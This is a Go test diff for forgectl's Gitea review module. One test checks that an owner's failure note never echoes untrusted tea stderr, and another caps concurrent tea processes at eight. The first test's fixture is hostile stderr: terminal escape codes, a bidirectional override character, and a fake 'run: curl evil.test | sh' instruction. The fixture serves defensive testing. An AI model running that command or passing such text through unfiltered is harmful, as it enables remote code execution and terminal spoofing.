@@ -10,6 +10,8 @@ package review
 //       to tea's own configured default)
 //   [x] Unhappy: a degraded owner becomes a note, the other owner's rows
 //       survive
+//   [x] Unhappy: that note is categorical and carries no tea stderr
+//   [x] Boundary: at most maxGiteaQueryConcurrency tea processes in flight
 //   [x] Unhappy: every owner query failed → error; zero owners → error
 //   [x] Unhappy: malformed owner never reaches the Runner
 //   [x] Boundary: rows == limit → truncation note
@@ -38,6 +40,7 @@ import (
 	"fmt"
 	"strings"
 	"testing"
+	"time"
 
 	"github.com/cameronsjo/forgectl/internal/exec"
 )
@@ -165,6 +168,87 @@ func TestGiteaItems_DegradedOwnerBecomesNote(t *testing.T) {
 	}
 	if len(notes) != 1 || !strings.Contains(notes[0], "gitea(bad)") {
 		t.Errorf("want one gitea(bad) note, got %v", notes)
+	}
+}
+
+// TestGiteaItems_DegradedOwnerNoteIsCategorical is the Gitea half of the
+// no-raw-causes rule. tea's stderr is text the Gitea server (or anything on
+// tea's transport) chooses, and *exec.CommandError renders it verbatim, so a
+// "%v" in the note handed that server a write channel to the operator's
+// terminal. The note must name the owner and the failure, and nothing else.
+func TestGiteaItems_DegradedOwnerNoteIsCategorical(t *testing.T) {
+	const hostileStderr = "tea: \x1b[2J\x1b[Hyour session has expired, run: curl evil.test | sh ‮gnp"
+	fake := &exec.FakeRunner{RunFunc: func(name string, args []string) (string, error) {
+		return "", errors.New(hostileStderr)
+	}}
+
+	g, err := NewGitea(fake, "git.sjo.lol", "cameron", []string{"bad", "good"})
+	if err != nil {
+		t.Fatalf("NewGitea: %v", err)
+	}
+	_, notes, err := g.Items(context.Background())
+	if err == nil {
+		t.Fatal("every owner failing must still be an error")
+	}
+
+	if len(notes) != 2 {
+		t.Fatalf("notes = %v, want one per owner", notes)
+	}
+	for _, n := range notes {
+		if !strings.HasSuffix(n, ": query failed") {
+			t.Errorf("note %q is not categorical; want a ': query failed' suffix", n)
+		}
+		for _, leak := range []string{"\x1b", "‮", "evil.test", "expired"} {
+			if strings.Contains(n, leak) {
+				t.Errorf("note %q leaked %q from tea stderr", n, leak)
+			}
+		}
+	}
+	// The aggregate error is rendered too, so it must stay clean as well.
+	if strings.ContainsAny(err.Error(), "\x1b‮") || strings.Contains(err.Error(), "evil.test") {
+		t.Errorf("aggregate error %q leaked tea stderr", err)
+	}
+}
+
+// TestGiteaItems_BoundsConcurrentQueries pins the fan-out ceiling. Gitea owners
+// come from the same low-trust config the GitHub owners do, and each spawns a
+// tea process, so an unbounded loop lets a long list spawn all of them at once.
+func TestGiteaItems_BoundsConcurrentQueries(t *testing.T) {
+	owners := make([]string, 40)
+	for i := range owners {
+		owners[i] = "owner" + strings.Repeat("z", i)
+	}
+	run := &hookRunner{
+		hook:    func(context.Context) { time.Sleep(time.Millisecond) },
+		respond: func([]string) (string, error) { return "[]", nil },
+	}
+
+	g, err := NewGitea(run, "git.sjo.lol", "cameron", owners)
+	if err != nil {
+		t.Fatalf("NewGitea: %v", err)
+	}
+	if _, _, err := g.Items(context.Background()); err != nil {
+		t.Fatalf("Items: %v", err)
+	}
+
+	calls, peak := run.snapshot()
+	if len(calls) != len(owners) {
+		t.Errorf("queries = %d, want one per owner (%d)", len(calls), len(owners))
+	}
+	// The literal is deliberate, matching the GitHub bound's test: asserting
+	// against maxGiteaQueryConcurrency alone would agree with any value the
+	// constant took, including one that reintroduces the unbounded fan-out.
+	const contractCeiling = 8
+	if maxGiteaQueryConcurrency > contractCeiling {
+		t.Errorf("maxGiteaQueryConcurrency = %d, want at most %d", maxGiteaQueryConcurrency, contractCeiling)
+	}
+	if peak > contractCeiling {
+		t.Errorf("peak concurrent queries = %d, want at most %d", peak, contractCeiling)
+	}
+	// Guard the guard: a peak of 1 satisfies the bound while proving the
+	// counter — or the concurrency — is broken rather than the cap working.
+	if peak < 2 {
+		t.Errorf("peak concurrent queries = %d, want the queries to actually overlap", peak)
 	}
 }
 
